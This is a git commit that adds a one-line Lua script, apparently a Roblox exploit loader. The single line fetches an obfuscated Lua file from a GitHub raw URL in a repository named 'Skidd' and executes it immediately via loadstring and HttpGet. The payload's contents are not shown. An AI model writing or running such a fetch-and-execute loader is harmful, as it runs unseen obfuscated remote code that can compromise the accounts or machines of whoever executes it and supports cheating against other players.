a9bd9e47920b65084caa04f13382ecfe54490db0
Ehehhdrhdhehehhehendducucuh <142185912+Ehehhdrhdhehehhehendducucuh@users.noreply.github.com>
2024-12-30 13:09:19 +0800

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ehehhdrhdhehehhehendducucuh/Skidd/refs/heads/main/obf_9Md9sw0a6ukDDdgdO4CUX5V4H18rGzC9Ay77N0iI4s4lSJD59XGtIHUIU00XFgZ2.lua.txt"))()
